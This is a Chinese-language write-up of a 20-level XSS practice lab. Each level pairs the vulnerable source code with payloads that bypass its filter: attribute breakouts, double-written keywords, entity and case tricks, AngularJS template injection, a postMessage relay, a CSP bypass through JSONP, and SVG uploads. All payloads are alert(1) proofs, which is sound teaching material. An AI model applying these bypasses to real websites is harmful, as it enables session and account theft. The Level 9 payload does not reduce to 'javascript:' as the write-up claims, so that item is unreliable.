# XSS Labs Writeup

本靶场包含 20 个不同类型的 XSS 关卡。以下是每一关的源码分析及通关思路。

---

## Level 1: Reflected XSS (Basic)

**源码分析：**
```php
$name = $_GET['name'];
// Vulnerability: No sanitization
echo "Hello, " . $name . "!";
```
后端直接接收 `name` 参数并输出到页面中，没有任何过滤或转义。

**通关思路：**
直接构造 Payload 即可。
**Payload:** `<script>alert(1)</script>`

---

## Level 2: DOM-based XSS

**源码分析：**
```javascript
const keyword = urlParams.get('keyword');
if (keyword) {
    const container = document.getElementById('result');
    container.innerHTML = "Search results for: " + keyword;
    // ... manual script execution logic ...
}
```
JS 从 URL 获取 `keyword` 参数并写入 `innerHTML`。虽然通常 `innerHTML` 不执行 `<script>`，但本关卡模拟了框架行为，主动扫描并执行了注入的脚本。

**通关思路：**
利用 `<img>` 等标签的事件属性，或者直接利用模拟执行的特性。
**Payload 1:** `<img src=x onerror=alert(1)>`
**Payload 2:** `<script>alert(1)</script>` (得益于模拟执行逻辑)

---

## Level 3: Stored XSS

**源码分析：**
```php
// 写入
file_put_contents($file, json_encode($data));
// 读取并输出
foreach (array_reverse($comments) as $c):
    echo $c['text']; // Vulnerability: No sanitization
endforeach;
```
用户的评论被保存到 JSON 文件中，读取时未经过 `htmlspecialchars` 处理直接输出。

**通关思路：**
在评论框输入恶意脚本，脚本被存储。当页面加载时，脚本被渲染执行。
**Payload:** `<script>alert(1)</script>`

---

## Level 4: Attribute Breakout

**源码分析：**
```php
$keyword = $_GET['keyword'];
// ...
echo '<input type="text" name="keyword" value="' . $keyword . '">';
```
输入被输出到了 `<input>` 标签的 `value` 属性中，且由**双引号**包裹。后端未对双引号进行转义。

**通关思路：**
闭合前面的双引号，添加事件属性，注释掉后面的内容。
**Payload:** `" onclick="alert(1)`
**解析后 HTML:** `<input value="" onclick="alert(1)">`

---

## Level 5: Filter Bypass (No Script)

**源码分析：**
```php
$str = str_ireplace("<script", "<scr_ipt", $str);
// on events are ALLOWED
```
后端使用 `str_ireplace` 将 `<script` 替换为 `<scr_ipt`，这阻止了直接使用 `<script>` 标签。但未过滤事件属性（如 `on...`）或伪协议。

**通关思路：**
利用不需要 `<script>` 标签的 Payload，例如 `<a>` 标签的 `href` 属性或事件属性。
**Payload:** `<a href="javascript:alert(1)">Click</a>`
**Payload:** `<img src=x onerror=alert(1)>`

---

## Level 6: Quote Filtering

**源码分析：**
```php
$keyword_safe = str_replace('"', '&quot;', $keyword);
// ...
echo "<input type='text' name='keyword' value='" . $keyword_safe . "'>";
```
后端过滤了双引号 `"`，但 HTML 源码中使用**单引号** `'` 包裹属性值。

**通关思路：**
利用 HTML 解析的宽容性，使用单引号闭合属性。
**Payload:** `' onclick='alert(1)`
**解析后 HTML:** `<input value='' onclick='alert(1)'>`

---

## Level 7: Keyword Removal (Double Write)

**源码分析：**
```php
$bad_words = ['script', 'on', 'src', 'data', 'href'];
$str = str_ireplace($bad_words, '', $str);
```
后端将敏感关键词替换为空字符串，且只执行了一次替换（非递归）。

**通关思路：**
双写关键词。例如 `script` 被替换为空，那么 `scrscriptipt` 中间的 `script` 消失后，两边的字符会重新拼合。
**Payload:** `"><scrscriptipt>alert(1)</scrscriptipt>`

---

## Level 8: Encoding Bypass

**源码分析：**
```php
$str = str_replace("script", "scr_ipt", $str);
// ... other replacements ...
$str = str_replace('"', '&quot;', $str);
echo '<a href="' . $str . '">Your Link</a>';
```
后端替换了大量关键词，并转义了双引号。但是输入点在 `href` 属性中。

**通关思路：**
利用 HTML 实体编码。浏览器在解析属性值时会自动解码实体。
**Payload:** `&#106;avascript:alert(1)` (j 被编码为 `&#106;`)
**浏览器解析:** `href="javascript:alert(1)"`

---

## Level 9: URL Validation

**源码分析：**
```php
$str = str_ireplace("script", "", $str); // 关键词清洗
if (strpos($str, 'http://') === false) {
    die("Error"); // 必须包含 http://
}
```
1.  输入必须包含 `http://`。
2.  `script` 关键词被清洗（替换为空）。

**通关思路：**
构造包含 `http://` 的 Payload，同时利用双写绕过 `script` 清洗。利用 JS 注释 `//` 来隐藏 `http://`。
**Payload:** `javascritpt:alert(1)//http://`
**后端清洗后:** `javascript:alert(1)//http://`

---

## Level 10: Protocol Bypass (Case Sensitivity)

**源码分析：**
```php
$str = str_replace("javascript", "", $str);
$str = str_replace("script", "", $str);
// 使用 str_replace (大小写敏感)
```
后端使用大小写敏感的 `str_replace` 过滤了全小写的 `javascript`。

**通关思路：**
利用浏览器对协议解析的大小写不敏感特性。
**Payload:** `Javascript:alert(1)`
**后端处理:** 无法匹配 `javascript`，原样放行。
**浏览器解析:** 识别为 `javascript:` 协议并执行。

---

## Level 11: URL Encoding

**源码分析：**
```php
$encoded_str = urlencode($str);
echo "var searchTerm = '$encoded_str';";
```
后端对输入进行了 `urlencode`，转换了 `<` `>` `"` `'` 等危险字符。
但是前端 JS 进行了解码：
```javascript
var decodedTerm = decodeURIComponent(searchTerm);
document.write('Current Search: ' + decodedTerm);
```
`document.write` 接收了解码后的字符串，这直接导致了 DOM 型 XSS。

**通关思路：**
后端虽然编码了，但前端又解码了，且用在了危险的 sink (`document.write`) 中。
**Payload:** `<script>alert(1)</script>`

---

## Level 12: DOM XSS via Hash

**源码分析：**
```javascript
var hash = window.location.hash;
if (hash) {
    var content = decodeURIComponent(hash.substring(1));
    document.getElementById('message-container').innerHTML = "Welcome back, " + content;
}
```
后端完全没有处理输入，因为输入是通过 URL Hash (`#`) 传递的，这部分根本不会发送给服务器。
前端 JS 读取 `location.hash` 并写入 `innerHTML`。

**通关思路：**
这是一种纯前端的 DOM XSS。由于数据不经过服务器，所有服务端 WAF 都无效。
直接构造包含 Payload 的 Hash。
**Payload:** `#<img src=x onerror=alert(1)>`
**注意:** 由于使用 `innerHTML`，直接 `<script>` 通常不执行，推荐使用 `<img>` 或 `<iframe>`。

---

## Level 13: Frontend Filter

**源码分析：**
```javascript
const blacklist = /<script|javascript:/i;
if (blacklist.test(keyword)) {
    // Blocked
} else {
    document.getElementById('result').innerHTML = "Results: " + keyword;
}
```
JS 使用正则 `/ <script|javascript:/i` 对输入进行了检测。如果通过，则写入 `innerHTML`。

**通关思路：**
正则只拦截了 `<script` 和 `javascript:`。但 `innerHTML` 还支持其他大量的 XSS 向量，如 `<img>`, `<iframe>`, `<svg>` 等。
**Payload:** `<img src=x onerror=alert(1)>`
**Payload:** `<svg/onload=alert(1)>`

---

## Level 14: JS Variable Escape

**源码分析：**
```php
echo "var search = \"$str\";";
```
输入被直接放置在 JavaScript 变量的字符串字面量中，仅使用了双引号包裹，且没有进行 JS 转义（如 `json_encode`）。

**通关思路：**
利用双引号 `"` 闭合前面的字符串，然后插入任意 JS 代码。
**Payload:** `"; alert(1); //`
**生成代码:** `var search = ""; alert(1); //";`

---

## Level 15: Framework Injection

**源码分析：**
```php
$safe_html = htmlspecialchars($str);
echo "<div id='result'>Hello, $safe_html</div>";
```
虽然 HTML 标签被转义，但输出位于 AngularJS 的 `ng-app` 作用域内。AngularJS 会解析 `{{ }}` 模板语法。

**通关思路：**
利用 AngularJS 模板注入 (CSTI)。
**Payload:** `{{constructor.constructor('alert(1)')()}}`

---

## Level 16: PostMessage XSS

**源码分析：**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('message-output').innerHTML = "Received: " + e.data;
});
```
后端过滤了 `iframe` src 中的 `javascript:`，但允许 `data:`。
iframe 加载 `data:` 协议内容后，源变为 `null`（opaque origin），无法直接访问父页面 DOM。
但父页面有一个监听 `message` 事件的 Handler，且直接将接收到的数据写入 `innerHTML`。

**通关思路：**
构造一个 `data:` 协议的 iframe，在其中运行 JS，通过 `parent.postMessage()` 发送 XSS Payload 给父页面。
**Payload:** `data:text/html,<script>parent.postMessage('<img src=x onerror=alert(1)>', '*')</script>`

---

## Level 17: CSP Bypass (JSONP)

**源码分析：**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self';");
if (isset($_GET['callback'])) {
    echo $_GET['callback'] . '({"status": "ok"});';
    exit;
}
```
启用了一个严格的 CSP：只允许同源脚本，禁止 inline 脚本。
这意味着 `<script>alert(1)</script>` 无法执行。
但是，同源下有一个 JSONP 端点（`?callback=...`），它会返回 JavaScript 代码。

**通关思路：**
利用 CSP 允许的同源脚本源（'self'）。
我们可以加载这个 JSONP 端点作为脚本，并控制 callback 参数来执行任意 JS。
**Payload:** `<script src="?callback=alert(1)"></script>`

---

## Level 18: Attribute Injection

**源码分析：**
```php
$str = str_replace('<', '&lt;', $str); // ... escapes quotes too but forgets &
echo '<iframe srcdoc="' . $str . '"></iframe>';
```
输入被置于 `srcdoc` 属性中。服务器虽然进行了部分转义，但没有转义 `&`。
`srcdoc` 的内容首先会被进行 HTML 属性解码，然后再作为 HTML 解析。

**通关思路：**
利用 `&` 构造 HTML 实体，绕过关键字过滤。
例如，服务器过滤 `script`，我们可以写 `&#115;cript`。
浏览器在解析属性时将其还原为 `script`，随后执行。
**Payload:** `<s&#99;ript>alert(1)</s&#99;ript>`

---

## Level 19: SVG XSS

**源码分析：**
```php
header('Content-Type: image/svg+xml');
$str = str_ireplace("script", "", $str);
$str = str_ireplace("on", "", $str);
$str = str_ireplace("javascript", "", $str);
echo '<svg><text>' . $str . '</text></svg>';
```
页面返回一个 SVG 文件（XML 格式）。
过滤器移除了 `script`, `on`, `javascript`。

**通关思路：**
1.  **XML 上下文**：SVG 是 XML，支持 XML 实体解析。
2.  **绕过 `javascript`**：在 XML 属性中，可以使用 HTML/XML 实体编码绕过关键字检测。例如 `j&#97;vascript:`。
3.  **构造 Payload**：需要闭合 `<text>` 标签，然后插入一个带有链接的元素（如 `<a>`），利用实体编码的 `javascript:` 协议执行脚本。
**Payload:** `</text><a href="j&#97;vascript:alert(1)"><text>Click Me</text></a><text>`

---

## Level 20: File Upload XSS

**源码分析：**
```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$blacklist = ['php', 'php5', 'phtml', 'exe', 'sh'];
// ... extension check ...
if ($file['type'] === 'text/html') {
    $error = "HTML files are not allowed!";
}
```
服务器通过黑名单过滤了可执行脚本后缀（防止 RCE），并检查 MIME 类型是否为 `text/html`。
但是，没有禁止 `.html` 后缀（如果 MIME 类型不匹配）。或者即使禁止了后缀，我们也可以上传 SVG。

**通关思路：**
1.  **上传 HTML**：将文件名设为 `xss.html`，但修改 `Content-Type` 为 `text/plain` 或 `image/png` 绕过 MIME 检查。浏览器访问时会根据后缀名将其作为 HTML 解析。
2.  **上传 SVG**：SVG 也是一种图片，通常被允许上传。在 SVG 中嵌入 `<script>` 标签。
**Payload (SVG):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
```
将上述内容保存为 `test.svg` 并上传。浏览器直接打开 SVG 图片时会执行脚本。
